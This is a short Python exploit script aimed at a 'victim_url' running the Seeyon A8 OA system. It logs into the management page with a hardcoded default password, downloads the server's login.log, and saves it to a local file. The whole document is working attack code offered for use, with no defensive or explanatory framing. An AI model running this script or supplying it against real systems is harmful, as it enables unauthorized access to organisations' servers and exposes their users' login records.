#encoding:UTF-8
#!/usr/bin/python
#version1.1
import requests
from bs4 import BeautifulSoup
import sys
#pip3 install bs4
#pip3 install requests

def usage():
    print("usage：.\seeyon.py <victim_url>")
    print("example：.\seeyon.py http://127.0.0.1")
    sys.exit(0)
    
def main():
    if not len(sys.argv[1:]):
        usage()
    elif sys.argv[1] == "-h":
        usage()

    url = sys.argv[1]
    #print(url)

    try:
        c = requests.Session()
        payload = {
            "password" : "WLCCYBD@SEEYON",
            "submit" : "Sign In"
        }

        c1 = c.post(url + "/seeyon/management/index.jsp",payload)
        if str(c1) == "<Response [200]>":
            print("200")
            c2 = c.get(url + "/seeyon/logs/login.log")
            #print(c2.text)

            f = open("A8_logs.txt","w")
            f.write(c2.text)
            f.close()
        else:
            print("404")
    except:
        usage()

if __name__ == '__main__':
    main()    
